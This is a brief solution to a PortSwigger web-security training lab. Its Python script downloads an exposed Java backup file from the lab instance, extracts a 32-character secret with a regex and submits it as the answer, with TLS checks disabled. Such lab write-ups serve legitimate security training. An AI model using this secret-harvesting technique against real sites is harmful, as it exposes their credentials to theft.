# Lab: Source code disclosure via backup files

Link to lab: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files

## Solution

```python
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0a6300a004abba11c439eb69009e00e0.web-security-academy.net/'

response = requests.get(
    url +'backup/ProductTemplate.java.bak',
    verify=False,
)
pattern = r"\b\w{32}\b"
match = re.search(pattern, response.text)

data = {
    'answer': match.group()
}

response = requests.post(
    url + 'submitSolution',
    data=data,
    verify=False,
)
print(response.text)
```